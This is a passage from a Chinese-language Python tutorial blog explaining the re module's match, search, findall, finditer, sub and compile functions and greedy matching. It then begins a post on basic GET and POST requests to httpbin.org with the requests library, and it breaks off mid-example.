<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;re.Match object; span&#x3D;(0, 15), match&#x3D;&#39;&lt;bead&gt;匹配&lt;&#x2F;bead&gt;&#39;&gt;</span><br></pre></td></tr></table></figure>


<div class="note info simple"><p>如果我匹配到不一样比如<code>&lt;bead&gt;匹配&lt;/h1&gt;</code></p>
</div>

<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;&lt;bead&gt;匹配&lt;/h1&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 我又添加一个防止转义r不让\转义</span></span><br><span class="line">x =re.match(<span class="string">r&#x27;&lt;(?P&lt;dead&gt;.+)&gt;.+&lt;/*(?P=dead)&gt;&#x27;</span>,pattern)</span><br><span class="line"></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">None</span><br></pre></td></tr></table></figure>
<h3 id="转义符"><a href="#转义符" class="headerlink" title="\转义符"></a><code>\</code>转义符</h3><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>比如我们想输入<code>\n</code>这个，在代码里面不能直接输入<code>\n</code>要通过<code>\</code>来转义了</p>
<p>在python里面可以在前面添加上一个<code>r</code>防止字符转义的，可以省略<code>\</code>转义符下面有演示</p>
</div> 

<div class="note info simple"><p>看一下我直接用<code>\n</code></p>
</div>

<ol>
<li><p><code>\n</code>转义符</p>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">&#x27;\nabc&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>结果：可以看见他是回车</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">abc</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>我们就可以用<code>\</code>来转义</p>
</div>

<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">&#x27;\\nabc&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>结果：可以看见这样就可以了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\nabc</span><br></pre></td></tr></table></figure></li>
<li><p><code>r</code>预防转义</p>
<div class="note info simple"><p>Python也可以用<code>r</code>预防转义</p>
</div>

<p> 代码</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">r&#x27;\nabc&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p> 结果：前面添加一个<code>r</code>就可以预防转义了</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\nabc</span><br></pre></td></tr></table></figure>


</li>
</ol>
<div class="note info simple"><p><strong>在正则表达式里面又如果匹配字符串里面的正则字符那</strong></p>
</div>



<ol>
<li><p>正则符号匹配</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;*das&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在正则里面*是匹配0次或多次，</span></span><br><span class="line">x =re.match(<span class="string">&#x27;*&#x27;</span>,pattern)</span><br><span class="line"></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>
<p> 结果：就报错了，应为在正则里面*是匹配0次或多次的意思</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3.9&#x2F;sre_parse.py&quot;, line 443, in _parse_sub</span><br><span class="line">    itemsappend(_parse(source, state, verbose, nested + 1,</span><br><span class="line">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3.9&#x2F;sre_parse.py&quot;, line 668, in _parse</span><br><span class="line">    raise source.error(&quot;nothing to repeat&quot;,</span><br><span class="line">re.error: nothing to repeat at position 0</span><br></pre></td></tr></table></figure>

<p> 就可以用\进行转义</p>
<p> 代码</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;*das&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在正则里面*是匹配0次或多次，我们用\进行转义</span></span><br><span class="line">x =re.match(<span class="string">&#x27;\*&#x27;</span>,pattern)</span><br><span class="line"></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>

<p> 结果：就可以匹配出来了</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;re.Match object; span&#x3D;(0, 1), match&#x3D;&#39;*&#39;&gt;</span><br></pre></td></tr></table></figure>



</li>
</ol>
<ol start="2">
<li><p>特殊字符串匹配</p>
<p> 特殊字符就是<code>\n</code>了<code>\t</code>了等</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;\\t&#x27;</span></span><br><span class="line"></span><br><span class="line">x =re.match(<span class="string">&#x27;\\t&#x27;</span>,pattern)</span><br><span class="line"></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>
<p> 结果：下面的结果为什么是None这是应为在，正则里面\也是转义符</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">None</span><br></pre></td></tr></table></figure>

<p> 我们需要添加双倍的<code>\\</code>进行转义</p>
<p> 代码</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;\\t&#x27;</span></span><br><span class="line"><span class="comment"># 就是\转义\</span></span><br><span class="line">x =re.match(<span class="string">&#x27;\\\\t&#x27;</span>,pattern)</span><br><span class="line"></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>

<p> 结果</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;re.Match object; span&#x3D;(0, 2), match&#x3D;&#39;\\t&#39;&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>也可以在匹配到添加<code>r</code>预防转义</p>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;\\t&#x27;</span></span><br><span class="line"><span class="comment"># 防止字符转义</span></span><br><span class="line">x =re.match(<span class="string">r&#x27;\\t&#x27;</span>,pattern)</span><br><span class="line"></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;re.Match object; span&#x3D;(0, 2), match&#x3D;&#39;\\t&#39;&gt;</span><br></pre></td></tr></table></figure>
<h3 id="非贪婪模式"><a href="#非贪婪模式" class="headerlink" title="?非贪婪模式"></a>?非贪婪模式</h3></li>
</ol>
<p><strong>在下面</strong></p>
<h1 id="search-函数"><a href="#search-函数" class="headerlink" title="search()函数"></a>search()函数</h1><div class="note info simple"><p>search()函数，在匹配时会扫描整个字符串，然后返回第一个成功匹配的结果，如果搜索完了还没有找到，就返回 <code>None</code></p>
</div>

<p>格式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">re.search(pattern, string, flags=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">pattern</td>
<td align="left">匹配的正则表达式</td>
</tr>
<tr>
<td align="left">string</td>
<td align="left">要匹配的字符串。</td>
</tr>
<tr>
<td align="left">flags</td>
<td align="left">标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。</td>
</tr>
</tbody></table>
<div class="note info simple"><p>match()测试</p>
</div>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">content = <span class="string">&#x27;Extra stings Hello 1234567&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 匹配content变量里面的Hello</span></span><br><span class="line">result = re.match(<span class="string">&#x27;Hello&#x27;</span>,content)</span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
<p>结果：应为match()函数只能从开头匹配第一个不是H而是E，所以直接就返回了<code>None</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">None</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>我们就可以用search()函数来匹配了</p>
</div>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">content = <span class="string">&#x27;Extra stings Hello 1234567&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 匹配content变量里面的Hello</span></span><br><span class="line">result = re.search(<span class="string">&#x27;Hello&#x27;</span>,content)</span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
<p>结果：可以看见成功，应为在匹配时会扫描整个字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;re.Match object; span&#x3D;(13, 18), match&#x3D;&#39;Hello&#39;&gt;</span><br></pre></td></tr></table></figure>


<h1 id="findall-和finditer-函数"><a href="#findall-和finditer-函数" class="headerlink" title="findall()和finditer()函数"></a>findall()和finditer()函数</h1><h2 id="findall-函数"><a href="#findall-函数" class="headerlink" title="findall()函数"></a>findall()函数</h2><div class="note info simple"><p>findall()他会获得表达式里面的全部内容，返回形式为数组</p>
</div>

<p>他的语法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">re.findall(pattern, string, flags=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th align="left">字符</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">pattern</td>
<td align="center">匹配的正则表达式</td>
</tr>
<tr>
<td align="left">string</td>
<td align="center">要匹配到字符串</td>
</tr>
<tr>
<td align="left">flags</td>
<td align="center">该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解如 re.IGNORECASE 等</td>
</tr>
</tbody></table>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;蔡徐坤 13500000001 18岁&#x27;</span></span><br><span class="line"></span><br><span class="line">x =re.findall(<span class="string">&#x27;\d&#123;11&#125;&#x27;</span>,pattern)</span><br><span class="line"></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>
<p>结果：他和这个<a href="https://regex101.com/r/Ljaf9U/1">https://regex101.com/r/Ljaf9U/1</a>差不多的他会返回表达式所匹配的全部内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;13500000001&#39;]</span><br></pre></td></tr></table></figure>
<h2 id="finditer-函数"><a href="#finditer-函数" class="headerlink" title="finditer()函数"></a>finditer()函数</h2><div class="note info simple"><p>findall()和finditer()函数是一样的，就是finditer()函数他返回的是迭代器，什么是迭代器可以看我这个笔记<a href="https://www.zssnp.top/2021/06/09/pythonddq/">https://www.zssnp.top/2021/06/09/pythonddq/</a></p>
</div>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;蔡徐坤 13500000001 18岁&#x27;</span></span><br><span class="line"></span><br><span class="line">x =re.finditer(<span class="string">&#x27;\d&#123;11&#125;&#x27;</span>,pattern)</span><br><span class="line"></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;callable_iterator object at 0x7faec31272b0&gt;</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210816122520768.png" alt="image-20210816122520768"></p>
<p>我们可以通过for进行迭代输出结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern=<span class="string">&#x27;蔡徐坤 13500000001 18岁&#x27;</span></span><br><span class="line"></span><br><span class="line">x =re.finditer(<span class="string">&#x27;\d&#x27;</span>,pattern)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 他返回的是一个对象</span></span><br><span class="line">    <span class="comment"># | group() | 返回匹配的字符串 |</span></span><br><span class="line">    <span class="comment"># | span() | 返回匹配的范围 |</span></span><br><span class="line">    <span class="comment"># | start() | 返回从那开始匹配的 |</span></span><br><span class="line">    <span class="comment"># | groups() | 返回全部分组 |</span></span><br><span class="line">    print(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># group()返回匹配的字符串</span></span><br><span class="line">    print(i.group())</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;re.Match object; span&#x3D;(4, 5), match&#x3D;&#39;1&#39;&gt;</span><br><span class="line">1</span><br><span class="line">&lt;re.Match object; span&#x3D;(5, 6), match&#x3D;&#39;3&#39;&gt;</span><br><span class="line">3</span><br><span class="line">&lt;re.Match object; span&#x3D;(6, 7), match&#x3D;&#39;5&#39;&gt;</span><br><span class="line">5</span><br><span class="line">&lt;re.Match object; span&#x3D;(7, 8), match&#x3D;&#39;0&#39;&gt;</span><br><span class="line">0</span><br><span class="line">&lt;re.Match object; span&#x3D;(8, 9), match&#x3D;&#39;0&#39;&gt;</span><br><span class="line">0</span><br><span class="line">&lt;re.Match object; span&#x3D;(9, 10), match&#x3D;&#39;0&#39;&gt;</span><br><span class="line">0</span><br><span class="line">&lt;re.Match object; span&#x3D;(10, 11), match&#x3D;&#39;0&#39;&gt;</span><br><span class="line">0</span><br><span class="line">&lt;re.Match object; span&#x3D;(11, 12), match&#x3D;&#39;0&#39;&gt;</span><br><span class="line">0</span><br><span class="line">&lt;re.Match object; span&#x3D;(12, 13), match&#x3D;&#39;0&#39;&gt;</span><br><span class="line">0</span><br><span class="line">&lt;re.Match object; span&#x3D;(13, 14), match&#x3D;&#39;0&#39;&gt;</span><br><span class="line">0</span><br><span class="line">&lt;re.Match object; span&#x3D;(14, 15), match&#x3D;&#39;1&#39;&gt;</span><br><span class="line">1</span><br><span class="line">&lt;re.Match object; span&#x3D;(16, 17), match&#x3D;&#39;1&#39;&gt;</span><br><span class="line">1</span><br><span class="line">&lt;re.Match object; span&#x3D;(17, 18), match&#x3D;&#39;8&#39;&gt;</span><br><span class="line">8</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210816144034906.png" alt="image-20210816144034906"></p>
<h1 id="sub-和subn-函数"><a href="#sub-和subn-函数" class="headerlink" title="sub()和subn()函数"></a>sub()和subn()函数</h1><div class="note info simple"><p>sub()这个函数是替换用的，可以叫文本的指定的字符替换掉</p>
</div>

<div class="note info simple"><p>他俩的区别就是</p>
<ul>
<li>sub()：他返回替换后的结果</li>
<li>subn()：他返回的是一个元组</li>
</ul>
</div>

<h2 id="sub"><a href="#sub" class="headerlink" title="sub()"></a>sub()</h2><p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">&#x27;54aK54yr5oiR54ix5L2g&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 叫数字的字符都替换成没有</span></span><br><span class="line">content = re.sub(<span class="string">&#x27;\d+&#x27;</span>, <span class="string">&#x27;&#x27;</span>, content)</span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">print(content)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aKyroiRixLg</span><br></pre></td></tr></table></figure>
<h2 id="subn"><a href="#subn" class="headerlink" title="subn()"></a>subn()</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">&#x27;54aK54yr5oiR54ix5L2g&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 叫数字的字符都替换成没有</span></span><br><span class="line">content = re.subn(<span class="string">&#x27;\d+&#x27;</span>, <span class="string">&#x27;&#x27;</span>, content)</span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">print(content)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&#39;aKyroiRixLg&#39;, 6)</span><br></pre></td></tr></table></figure>


<h1 id="compile-函数"><a href="#compile-函数" class="headerlink" title="compile()函数"></a>compile()函数</h1><div class="note info simple"><p>compile()函数将指定的源作为代码对象返回，并准备执行，他里面也是包含<code>sub(),findall(),search(),match()</code>等方法</p>
</div>

<p>下面代码演示一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>  re</span><br><span class="line"></span><br><span class="line">s=<span class="string">&quot;ds21212adsa212dsa&quot;</span></span><br><span class="line"></span><br><span class="line">rea=re.compile(<span class="string">&#x27;\d&#x27;</span>) <span class="comment"># 只匹配数字</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用compile()的findall方法来匹配s变量里面的内容</span></span><br><span class="line">print(rea.findall(s))</span><br></pre></td></tr></table></figure>
<p>结果</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210524225156472.png" alt="image-20210524225156472"></p>
<p><a href="https://www.bilibili.com/video/BV1q4411y7Zh?t=338&p=1">视频参考</a></p>
<h1 id="贪婪模式和非贪婪模式"><a href="#贪婪模式和非贪婪模式" class="headerlink" title="贪婪模式和非贪婪模式"></a>贪婪模式和非贪婪模式</h1><div class="note info simple"><p>正则表达式默认就是贪婪模式</p>
<ul>
<li><p>贪婪模式就是尽可能的匹配多的</p>
</li>
<li><p>非贪婪模式尽可能匹配少的</p>
</li>
</ul>
</div>

<p><strong>看一下什么是贪婪模式</strong>，他匹配的是<code>|&lt;|h1&gt;&gt;&gt;&gt;&gt;&gt;|&gt;|</code>最外面的</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210816170828451.png" alt="image-20210816170828451"></p>
<p><strong>看一下什么是非贪婪模式</strong>，他匹配的是<code>|&lt;|h1|&gt;|&gt;&gt;&gt;&gt;&gt;&gt;</code>最少的</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210816171216664.png" alt="image-20210816171216664"></p>
]]></content>
      <categories>
        <category>Python爬虫</category>
      </categories>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Python爬虫4requests库使用</title>
    <url>/2021/03/04/python%E7%88%AC%E8%99%AB4/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h1 id="requests库介绍和安装"><a href="#requests库介绍和安装" class="headerlink" title="requests库介绍和安装"></a>requests库介绍和安装</h1><div class="note warning simple"><p>urllib库是python自带的一个库，requests库是第三方的库，需要安装</p>
</div>

<div class="note info simple"><p>urllib库用起来很麻烦，比较繁琐</p>
</div>

<div class="note info simple"><p>requests库是基于urllib库采用Apache2协议开源的Python HTTP库，号称是<strong>为人类准备的HTTP库</strong></p>
</div>

<p>下载安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install  requests</span><br></pre></td></tr></table></figure>
<p>可以在调用的使用有点可能需要root权限才行</p>
<h1 id="requests请求的方法"><a href="#requests请求的方法" class="headerlink" title="requests请求的方法"></a>requests请求的方法</h1><div class="note info simple"><p>requests支持很多种的请求方法，下面的八种请求方法</p>
</div>

<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="left">requests.request()</td>
<td align="left">构造一个请求，支持以下各种方法</td>
</tr>
<tr>
<td align="left">requests.get()</td>
<td align="left">获取html的主要方法</td>
</tr>
<tr>
<td align="left">requests.head()</td>
<td align="left">获取html头部信息的主要方法</td>
</tr>
<tr>
<td align="left">requests.post()</td>
<td align="left">向html网页提交post请求的方法</td>
</tr>
<tr>
<td align="left">requests.put()</td>
<td align="left">向html网页提交put请求的方法</td>
</tr>
<tr>
<td align="left">requests.patch()</td>
<td align="left">向html提交局部修改的请求</td>
</tr>
<tr>
<td align="left">requests.delete()</td>
<td align="left">向html提交删除请求</td>
</tr>
</tbody></table>
<div class="note info simple"><p>这个网站可以验证请求<a href="http://httpbin.org/">http://httpbin.org/</a>会吧你请求的数据给返回回来</p>
<p>下面演示一下GET请求</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210227123353674.png" alt="image-20210227123353674"></p>
<p>打开GET</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210227123537676.png" alt="image-20210227123537676"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210227123614207.png" alt="image-20210227123614207"></p>
<p>他会给你一个URL</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210311105256820.png" alt="image-20210311105256820"></p>
<p>我们访问他看一下</p>
<p>他会叫请求的内容给返回回来</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210227123716769.png" alt="image-20210227123716769"></p>
<h1 id="Response响应属性"><a href="#Response响应属性" class="headerlink" title="Response响应属性"></a>Response响应属性</h1><div class="note info simple"><p>下面我常用的</p>
</div> 



<table>
<thead>
<tr>
<th align="center">属性</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">r.text</td>
<td align="center">响应回字符串数据，比如网站源代码</td>
</tr>
<tr>
<td align="center">r.status_code</td>
<td align="center">响应的状态码</td>
</tr>
<tr>
<td align="center">r.content</td>
<td align="center">二进制响应回去的内容，比如照片视频</td>
</tr>
<tr>
<td align="center">r.url</td>
<td align="center">获取请求地址</td>
</tr>
<tr>
<td align="center">r.cookies</td>
<td align="center">获取请求后的cookies信息</td>
</tr>
<tr>
<td align="center">r.cookies.get_dict()</td>
<td align="center">获取返回的cookies信息</td>
</tr>
<tr>
<td align="center">r.request</td>
<td align="center">获取请求方式</td>
</tr>
<tr>
<td align="center">r.encoding</td>
<td align="center">进行Response对象编码，就是编码</td>
</tr>
<tr>
<td align="center">r.json()</td>
<td align="center">内置的json解码器</td>
</tr>
<tr>
<td align="center">r.headers</td>
<td align="center">叫请求的全部的头部变成字典，字典键不区分大小写</td>
</tr>
<tr>
<td align="center">r.history</td>
<td align="center">属性得到请求历史</td>
</tr>
</tbody></table>
<h1 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h1><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>HTTP 中最常见的请求之一就是 GET 请求</p>
</div> 

<h2 id="基本实例"><a href="#基本实例" class="headerlink" title="基本实例"></a>基本实例</h2><p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">&#x27;http://httpbin.org/get&#x27;</span>)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;args&quot;: &#123;&#125;, </span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;Accept&quot;: &quot;*&#x2F;*&quot;, </span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, </span><br><span class="line">    &quot;Host&quot;: &quot;httpbin.org&quot;, </span><br><span class="line">    &quot;User-Agent&quot;: &quot;python-requests&#x2F;2.25.1&quot;, </span><br><span class="line">    &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-6039d18d-5cb9a49d6c15706c15d339e3&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;origin&quot;: &quot;39.149.143.81&quot;, </span><br><span class="line">  &quot;url&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>图</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210227125934173.png" alt="image-20210227125934173"></p>
<h2 id="get-方法的参数"><a href="#get-方法的参数" class="headerlink" title="get()方法的参数"></a>get()方法的参数</h2><p>格式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">requests.get(<span class="string">&#x27;url&#x27;</span>,参数,修改头)</span><br></pre></td></tr></table></figure>
<div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>下面是演示</p>
</div> 

<h3 id="get请求参数"><a href="#get请求参数" class="headerlink" title="get请求参数"></a>get请求参数</h3><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>直接添加参数是不灵活的例如</p>
</div> 

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">&#x27;http://httpbin.org/get?name=germey&amp;age=22&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<p>我们可以用字典的方式进行参数添加</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数，用字典的键值对来定义</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;germey&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span>: <span class="number">22</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#  添加上面的定义的字典</span></span><br><span class="line">r = requests.get(<span class="string">&quot;http://httpbin.org/get&quot;</span>, params=data)</span><br><span class="line"><span class="comment"># 输出源代码</span></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;args&quot;: &#123;</span><br><span class="line">    &quot;age&quot;: &quot;22&quot;, </span><br><span class="line">    &quot;name&quot;: &quot;germey&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;Accept&quot;: &quot;*&#x2F;*&quot;, </span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, </span><br><span class="line">    &quot;Host&quot;: &quot;httpbin.org&quot;, </span><br><span class="line">    &quot;User-Agent&quot;: &quot;python-requests&#x2F;2.23.0&quot;, </span><br><span class="line">    &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-603a00e4-1baf3cb401034c75137d2812&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;origin&quot;: &quot;39.149.143.81&quot;, </span><br><span class="line">  &quot;url&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get?age&#x3D;22&amp;name&#x3D;germey&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>图</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210227162130894.png" alt="image-20210227162130894"></p>
<h3 id="修改get请求头"><a href="#修改get请求头" class="headerlink" title="修改get请求头"></a>修改get请求头</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"></span><br><span class="line">data = &#123;  <span class="comment"># 参数 用字典的键值对来定义</span></span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;germey&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span>: <span class="number">22</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;   <span class="comment"># 定义User-Agent请求头，用键值对的方式</span></span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#  添加上面的定义的字典</span></span><br><span class="line">r = requests.get(<span class="string">&quot;http://httpbin.org/get&quot;</span>, params=data ,headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出源代码</span></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>



<h1 id="POST-请求"><a href="#POST-请求" class="headerlink" title="POST 请求"></a>POST 请求</h1><p>POST请求很简单</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;germey&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span>: <span class="string">&#x27;22&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(<span class="string">&quot;http://httpbin.org/post&quot;</span>, data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<p>结果</p>
